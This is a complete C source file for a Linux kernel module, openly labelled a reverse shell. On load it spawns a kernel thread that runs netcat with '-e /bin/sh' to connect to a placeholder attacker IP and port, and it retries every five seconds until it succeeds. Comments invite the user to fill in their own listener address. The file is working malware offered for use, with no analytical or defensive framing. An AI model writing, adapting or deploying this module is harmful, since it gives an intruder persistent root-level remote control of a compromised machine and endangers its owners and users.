#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/net.h>
#include <linux/in.h>

#define ATTACKER_IP "192.168.100.1"  // Replace with the attacker's IP
#define ATTACKER_PORT "4444"         // Replace with the port the attacker is listening on
#define RETRY_DELAY 5                // Retry delay in seconds

static struct task_struct *reverse_shell_thread;

static int spawn_reverse_shell(void) {
    char *argv[] = {"/usr/bin/nc", ATTACKER_IP, ATTACKER_PORT, "-e", "/bin/sh", NULL};
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin",
        NULL,
    };

    struct subprocess_info *sub_info;
    int ret;

    printk(KERN_INFO "Reverse Shell: Spawning reverse shell...\n");

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
    if (!sub_info) {
        printk(KERN_ERR "Reverse Shell: Failed to setup usermode helper\n");
        return -ENOMEM;
    }

    ret = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    if (ret) {
        printk(KERN_ERR "Reverse Shell: Failed to spawn shell, error: %d\n", ret);
    } else {
        printk(KERN_INFO "Reverse Shell: Shell successfully spawned\n");
    }

    return ret;
}

static int reverse_shell_thread_fn(void *data) {
    while (!kthread_should_stop()) {
        if (spawn_reverse_shell() == 0) {
            break; // Exit if the shell was successfully spawned
        }
        ssleep(RETRY_DELAY); // Wait before retrying
    }
    return 0;
}

static int __init reverse_shell_init(void) {
    printk(KERN_INFO "Reverse Shell: Initializing module...\n");

    reverse_shell_thread = kthread_run(reverse_shell_thread_fn, NULL, "reverse_shell_thread");
    if (IS_ERR(reverse_shell_thread)) {
        printk(KERN_ERR "Reverse Shell: Failed to create kernel thread\n");
        return PTR_ERR(reverse_shell_thread);
    }

    printk(KERN_INFO "Reverse Shell: Module loaded\n");
    return 0;
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Reverse Shell: Exiting module...\n");

    if (reverse_shell_thread) {
        kthread_stop(reverse_shell_thread);
        printk(KERN_INFO "Reverse Shell: Thread stopped\n");
    }

    printk(KERN_INFO "Reverse Shell: Module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Reverse Shell Kernel Module");
MODULE_VERSION("1.0");


